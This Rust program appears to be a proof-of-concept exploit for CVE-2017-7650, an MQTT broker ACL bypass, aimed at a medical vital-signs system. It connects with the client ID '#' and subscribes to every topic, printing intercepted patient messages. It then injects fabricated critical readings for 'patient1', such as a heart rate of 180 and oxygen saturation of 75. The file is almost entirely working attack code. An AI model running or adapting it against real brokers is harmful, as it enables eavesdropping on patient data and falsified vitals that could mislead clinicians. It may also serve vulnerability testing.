use rumqttc::{AsyncClient, MqttOptions, QoS, Event, Packet};
use serde::{Deserialize, Serialize};
use std::time::Duration;
use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
use tokio::time::sleep;

#[derive(Serialize, Deserialize, Debug)]
struct VitalSigns {
    patient_id: String,
    heart_rate: u32,
    blood_pressure_systolic: u32,
    blood_pressure_diastolic: u32,
    oxygen_saturation: f32,
    temperature: f32,
    timestamp: u64,
}

#[tokio::main]
async fn main() {
    let broker_host = std::env::var("BROKER_HOST").unwrap_or("localhost".into());
    let broker_port: u16 = std::env::var("BROKER_PORT")
        .unwrap_or("1883".into())
        .parse()
        .unwrap();

    println!("CVE-2017-7650 - MQTT ACL Bypass Exploit");
    println!();
    println!("[*] Target: {}:{}", broker_host, broker_port);
    println!("[*] Technique: client_id='#' bypasses pattern ACL check");
    println!();

    let mut opts = MqttOptions::new("#", &broker_host, broker_port);
    opts.set_credentials("patient1", "pass_patient1");
    opts.set_keep_alive(Duration::from_secs(30));

    let (client, mut eventloop) = AsyncClient::new(opts, 10);

    let connected = Arc::new(AtomicBool::new(false));
    let attack_successful = Arc::new(AtomicBool::new(false));

    let connected_clone = connected.clone();
    tokio::spawn(async move {
        loop {
            match eventloop.poll().await {
                Ok(Event::Incoming(Packet::ConnAck(ack))) => {
                    println!("[+] Connection successful! ConnAck: {:?}", ack.code);
                    connected_clone.store(true, Ordering::SeqCst);
                }
                Ok(Event::Incoming(Packet::Publish(p))) => {
                    let payload = String::from_utf8_lossy(&p.payload);
                    println!("[SPY] Intercepted message on '{}': {}", p.topic, payload);
                }
                Ok(_) => {}
                Err(e) => {
                    eprintln!("[-] Eventloop error: {}", e);
                    break;
                }
            }
        }
    });

    sleep(Duration::from_secs(2)).await;

    if !connected.load(Ordering::SeqCst) {
        println!("[-] Connection failed - broker rejected client_id='#'");
        println!();
        println!("═══════════════════════════════════════════════════════");
        println!("ATTACK RESULT: BLOCKED");
        println!("  Broker rejected connection with client_id='#'");
        println!("  ACL bypass not possible on patched version");
        println!("  Medical data integrity preserved");
        println!("═══════════════════════════════════════════════════════");
        return;
    }

    println!("[*] Phase 1: Attempting subscribe to all topics (should be forbidden)...");
    match client.subscribe("#", QoS::AtLeastOnce).await {
        Ok(_) => println!("[+] Subscribe to '#' successful — ACL bypass confirmed!"),
        Err(e) => println!("[-] Subscribe rejected: {}", e),
    }

    sleep(Duration::from_secs(3)).await;

    println!();
    println!("[*] Phase 2: Injecting fake medical data...");
    println!("[*] Writing to topic 'health/data/patient1' (attacker is NOT patient1)");
    println!();

    for i in 1..=5u64 {
        let fake_vitals = VitalSigns {
            patient_id: "patient1".to_string(),
            heart_rate: 180 + i as u32,
            blood_pressure_systolic: 60,
            blood_pressure_diastolic: 40,
            oxygen_saturation: 75.0,
            temperature: 40.5,
            timestamp: i,
        };

        let payload = serde_json::to_string(&fake_vitals).unwrap();
        let target_topic = "health/data/patient1";

        match client.publish(target_topic, QoS::AtLeastOnce, false, payload.as_bytes()).await {
            Ok(_) => {
                attack_successful.store(true, Ordering::SeqCst);
                println!("[+] Iteration {}/5 — Fake data injected to '{}':", i, target_topic);
                println!("    Payload: {}", payload);
                println!("    Monitor receives fake critical state for patient1!");
            }
            Err(e) => println!("[-] Publish rejected: {}", e),
        }

        sleep(Duration::from_secs(2)).await;
    }

    println!();
    println!("═══════════════════════════════════════════════════════");
    if attack_successful.load(Ordering::SeqCst) {
        println!("ATTACK RESULT: SUCCESSFUL");
        println!("  ACL bypass via client_id='#' confirmed");
        println!("  Attacker published to topic without permission");
        println!("  Fake critical vital signs injected into system");
        println!("  Medical data integrity violated");
    } else {
        println!("ATTACK RESULT: BLOCKED");
        println!("  Broker rejected connection with client_id='#'");
        println!("  ACL bypass not possible on patched version");
        println!("  Medical data integrity preserved");
    }
    println!("═══════════════════════════════════════════════════════");

    sleep(Duration::from_secs(5)).await;
}